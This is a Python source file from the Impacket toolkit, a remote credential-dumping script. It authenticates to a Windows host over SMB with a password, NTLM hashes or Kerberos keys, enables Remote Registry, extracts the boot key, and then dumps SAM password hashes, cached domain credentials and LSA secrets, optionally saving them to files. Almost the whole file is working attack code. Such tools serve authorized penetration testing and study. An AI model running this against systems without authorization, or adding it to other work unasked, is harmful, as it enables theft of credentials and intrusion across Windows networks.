#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Authors:
#   Alberto Solino (@agsolino)
#   Julien Egloff (@laxaa)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

import argparse
import codecs
import logging
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.examples.regsecrets import LSASecrets, RemoteOperations, SAMHashes

from impacket.krb5.keytab import Keytab
from binascii import unhexlify, hexlify

class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = options.outputfile
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__LSASecrets = None
        self.__bootkey = options.bootkey
        self.__doKerberos = options.k
        self.__history = options.history
        self.__kdcHost = options.dc_ip
        self.__nosam = options.nosam
        self.__nocache = options.nocache
        self.__nolsa = options.nolsa
        self.__throttle = options.throttle

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            bootKey = None
            try:
                self.connect()
                self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                self.__remoteOps.enableRegistry()
            except Exception as e:
                logging.error('RemoteOperations failed: %s' % str(e))
            if not self.__bootkey:
                try:
                    bootKey = self.__remoteOps.getBootKey()
                except Exception as e:
                    logging.error('RemoteOperations failed: %s' % str(e))
            else:
                if self.__bootkey.startswith('0x'):
                    self.__bootkey = self.__bootkey[2:]
                bootKey = unhexlify(self.__bootkey)
                logging.info('Target system bootKey: 0x%s' % hexlify(bootKey).decode('utf-8'))

            if bootKey is None:
                raise Exception('Failed to fetch bootKey')

            if not self.__nosam:
                try:
                    self.__SAMHashes = SAMHashes(bootKey, remoteOps=self.__remoteOps, throttle=self.__throttle)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('SAM hashes extraction failed: %s' % str(e))

            try:
                self.__LSASecrets = LSASecrets(bootKey, self.__remoteOps,
                                                 history=self.__history, throttle=self.__throttle)
                if not self.__nocache:
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                if not self.__nolsa:
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error('LSA hashes extraction failed: %s' % str(e))

            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            try:
                self.cleanup()
            except:
                logging.info('Failed to perform cleanup...')
                pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        self.__smbConnection.logoff()

# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-nosam', action='store_true', help='Do not retrieve SAM information', default=False)
    parser.add_argument('-nocache', action='store_true', help='Do not retrieve MSCache information', default=False)
    parser.add_argument('-nolsa', action='store_true', help='Do not retrieve LSASecrets', default=False)
    parser.add_argument('-throttle', action='store', help='Throttle in seconds between operations', default=0, type=int)
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets and cached')

    group = parser.add_argument_group('display options')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    domain, username, password, remoteName = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = remoteName

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
